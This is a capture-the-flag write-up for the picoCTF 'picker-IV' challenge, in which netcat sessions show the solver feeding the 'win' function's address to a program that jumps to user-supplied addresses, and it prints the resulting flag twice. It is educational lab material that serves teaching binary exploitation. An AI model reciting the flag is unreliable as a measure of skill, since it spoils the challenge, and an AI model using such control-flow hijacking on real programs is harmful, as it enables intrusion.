## Description
Can you figure out how this program works to get the flag? Connect to the program with netcat: `$ nc saturn.picoctf.net 64321` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/528/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/528/picker-IV).

## Hints
1. With Python, there are no binaries. With compiled languages like C, there is source code, and there are binaries. Binaries are created from source code, they are a conversion from the human-readable source code, to the highly efficient machine language, in this case: x86_64.
2. How can you find the address that `win` is at?

## Solution


```bash
┌──(ulrich㉿DasMausoleum)-[~/Documentos/Apuntes 8vo Semestre/Binary-Explotation]
└─$ nc saturn.picoctf.net 64321
Enter the address in hex to jump to, excluding '0x': 0x02
You input 0x2
Segfault triggered! Exiting.
                                                                                   
┌──(ulrich㉿DasMausoleum)-[~/Documentos/Apuntes 8vo Semestre/Binary-Explotation]
└─$ nc saturn.picoctf.net 64321
Enter the address in hex to jump to, excluding '0x': AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
You input 0xffffffff
Segfault triggered! Exiting.
 -
 -
 -
┌──(ulrich㉿DasMausoleum)-[~/Documentos/Apuntes 8vo Semestre/Binary-Explotation]
└─$ nc saturn.picoctf.net 64321
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}

```

## Flag
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}

## Aditional Notes

## References
